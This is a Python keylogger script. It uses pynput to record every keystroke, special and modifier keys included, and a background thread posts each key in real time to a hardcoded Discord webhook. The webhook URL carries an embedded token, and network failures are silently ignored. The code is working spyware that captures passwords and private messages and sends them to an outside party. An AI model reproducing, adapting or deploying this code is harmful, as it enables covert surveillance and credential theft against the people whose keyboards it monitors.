import pynput.keyboard
import requests
import threading
import queue
import time
import os

# --- Configuration ---
# Your provided Discord Webhook URL
WEBHOOK_URL = "https://discord.com/api/v10/webhooks/1465626136330502288/KaPOIOxShd9sMrmLq33ck2kAFmW1eWx4SN6ZdZmFBWOHWtl1QMoKIdG1KfJaIyZnLo9s"
# Name to appear on the Discord webhook
SENDER_NAME = "RealTime_Interceptor" 

# Queue to hold keystrokes before they are sent
keystroke_queue = queue.Queue()
# Thread stop flag
stop_event = threading.Event()

def send_message(content):
    """Worker function to execute the POST request."""
    # Since we are sending every keystroke, the content is simple
    payload = {
        "content": content,
        "username": SENDER_NAME
    }
    
    try:
        # Minimal timeout to avoid blocking the worker thread for too long
        requests.post(WEBHOOK_URL, json=payload, timeout=2)
    except requests.exceptions.RequestException:
        # Silently fail on network error, losing only one keystroke
        pass

def processing_worker():
    """Worker thread that continuously pulls from the queue and sends data."""
    while not stop_event.is_set():
        try:
            # Wait briefly for an item in the queue
            key_data = keystroke_queue.get(timeout=0.1)
            send_message(key_data)
            keystroke_queue.task_done()
        except queue.Empty:
            continue
        except Exception:
            time.sleep(0.5)
            continue

def on_press(key):
    """Callback function executed when a key is pressed."""
    
    output = ""
    try:
        # Printable character
        output = key.char
        
    except AttributeError:
        # Special key handling
        key_name = str(key).split('.')[-1].upper()
        
        # Format common keys for clean output
        if key == pynput.keyboard.Key.space:
            output = "[SPACE]"
        elif key == pynput.keyboard.Key.enter:
            output = "[ENTER]"
        elif key == pynput.keyboard.Key.tab:
            output = "[TAB]"
        elif key == pynput.keyboard.Key.backspace:
            output = "[BACKSPACE]"
        elif key in [pynput.keyboard.Key.shift, pynput.keyboard.Key.shift_l, pynput.keyboard.Key.shift_r, 
                     pynput.keyboard.Key.ctrl, pynput.keyboard.Key.ctrl_l, pynput.keyboard.Key.ctrl_r, 
                     pynput.keyboard.Key.alt, pynput.keyboard.Key.alt_l, pynput.keyboard.Key.alt_r]:
            # Log modifiers when pressed
            output = f"<{key_name}_PRESSED>"
        else:
            # Log other functional keys
            output = f"[{key_name}]"
            
    if output:
        # Put the resulting string into the queue
        keystroke_queue.put(output)
    
# --- Main Execution ---
if __name__ == "__main__":
    
    # 1. Start the processing worker thread
    worker_thread = threading.Thread(target=processing_worker)
    worker_thread.daemon = True 
    worker_thread.start()

    # 2. Start the keyboard listener
    with pynput.keyboard.Listener(on_press=on_press) as listener:
        try:
            # The listener main thread blocks here, waiting for key events
            listener.join()
        except Exception:
            pass
        finally:
            stop_event.set()
            worker_thread.join(timeout=5) # Attempt a clean exit